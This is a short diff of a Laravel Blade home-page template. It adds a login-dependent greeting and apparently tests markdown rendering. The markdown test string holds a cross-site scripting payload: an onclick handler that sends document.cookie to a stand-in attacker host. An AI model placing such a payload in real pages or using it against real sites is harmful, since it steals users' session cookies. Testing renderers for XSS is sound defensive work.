@@ -4,6 +4,12 @@
     <h1>Home page</h1>
     <p>Current time: {{ date('F j, Y, g:i A') }}  </p>
 
+    @if (Auth::check())
+    <p>Welcome Dave!</p>
+    @else
+    Nope?
+    @endif
+
 <h2>Testing Markdown</h2>
 {{ HTML::markdown('<a href=# onclick=\"document.location=\'http://not-real-xssattackexamples.com/xss.php?c=\'+escape\(document.cookie\)\;\">This is</a> an example of the PHP Typography project.
 
